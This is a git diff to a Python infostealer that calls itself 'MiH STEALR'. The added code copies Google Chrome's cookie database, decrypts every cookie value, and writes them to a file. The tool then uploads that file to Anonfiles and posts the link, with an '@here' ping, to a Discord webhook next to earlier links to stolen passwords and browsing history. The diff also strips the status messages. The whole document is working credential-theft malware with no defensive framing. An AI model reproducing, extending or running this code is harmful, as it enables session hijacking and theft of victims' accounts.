@@ -115,6 +115,44 @@ def main():
         os.remove(filename)
     except:
         pass
+def extract_chrome_cookies(output_file="chrome_cookies.txt"):
+    key = get_encryption_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+    temp_db_path = "temp_cookies_copy"
+
+    shutil.copy2(db_path, temp_db_path)
+
+    connection = sqlite3.connect(temp_db_path)
+    cursor = connection.cursor()
+
+    query = """
+    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+    FROM cookies"""
+    cursor.execute(query)
+    cookies_entries = cursor.fetchall()
+
+    connection.close()
+
+    with open(output_file, "w", encoding="utf-8") as file:
+        file.write("___  ___  ___ ______ _____   _____ _   _   _   _  _____  ___  _   _ _____ _   _\n")
+        file.write("|  \\/  | / _ \\|  _  \\  ___| |_   _| \\ | | | | | ||  ___|/ _ \\| | | |  ___| \\ | |\n")
+        file.write("| .  . |/ /_\\ \\ | | | |__     | | |  \\| | | |_| || |__ / /_\\ \\ | | | |__ |  \\| |\n")
+        file.write("| |\\/| ||  _  | | | |  __|    | | | . ` | |  _  ||  __||  _  | | | |  __|| . ` |\n")
+        file.write("| |  | || | | | |/ /| |___   _| |_| |\\  | | | | || |___| | | \\ \\_/ / |___| |\\  |\n")
+        file.write("\\_|  |_/\\_| |_/___/ \\____/   \\___/\\_| \\_/ \\_| |_/\____/\\_| |_/\\___/\\____/\\_| \\_/\n")
+        file.write("\n")
+
+        file.write("Host, Cookie name, Cookie value (decrypted), Creation datetime (UTC), Last access datetime (UTC), Expires datetime (UTC)\n")
+        for entry in cookies_entries:
+            host_key = entry[0]
+            name = entry[1]
+            encrypted_value = entry[6]
+            decrypted_value = decrypt_password(encrypted_value, key)
+            creation_utc = get_chrome_datetime(entry[3])
+            last_access_utc = get_chrome_datetime(entry[4])
+            expires_utc = get_chrome_datetime(entry[5])
+
+            file.write(f"{host_key}, {name}, {decrypted_value}, {creation_utc}, {last_access_utc}, {expires_utc}\n")
 
     with zipfile.ZipFile('decrypted_passwords.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
         zipf.write('decrypted_passwords.txt')
@@ -122,6 +160,7 @@ def main():
     username = os.getenv("USERNAME")
     pass_link = upload_to_anonfiles('decrypted_passwords.zip')
     history_link = upload_to_anonfiles('chrome_history.txt')
+    cookies_link = upload_to_anonfiles('chrome_cookies.txt')
 
     if pass_link:
         webhook_url = ''
@@ -130,6 +169,7 @@ def main():
         embeds = {
             "avatar_url": "https://cdn.discordapp.com/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&",
             "username": "MiH STEALR",
+            "content": "@here",
             "embeds": [
                 {
                     "title": "YOU'VE REACHED HEAVEN !",
@@ -141,26 +181,20 @@ def main():
                 {
                     "title": "Credentials",
                     "fields": [
-                        {"name": "Retrieved passwords :", "value": f"```{pass_link}```", "inline": True}
+                        {"name": ":key: Retrieved passwords :", "value": f"```{pass_link}```", "inline": True}
                     ]
                 },
                 {
                     "title": "Credentials",
                     "fields": [
-                        {"name": "Chrome History :", "value": f"```{history_link}```", "inline": True}
+                        {"name": ":globe_with_meridians: Chrome History :", "value": f"```{history_link}```", "inline": True},
+                        {"name": ":cookie: Cookies :", "value": f"```{cookies_link}```", "inline": True}
                     ]
                 }
             ]
         }
 
         response = requests.post(webhook_url, json=embeds)
-
-        if response.status_code == 200:
-            print('Message Discord envoyé avec succès !')
-        else:
-            print(f'Erreur {response.status_code} lors de l\'envoi du message Discord. Réponse du serveur : {response.text}')
-    else:
-        print('Erreur lors de l\'upload du fichier vers Anonfiles.')
 
 if __name__ == "__main__":
     extract_chrome_history()
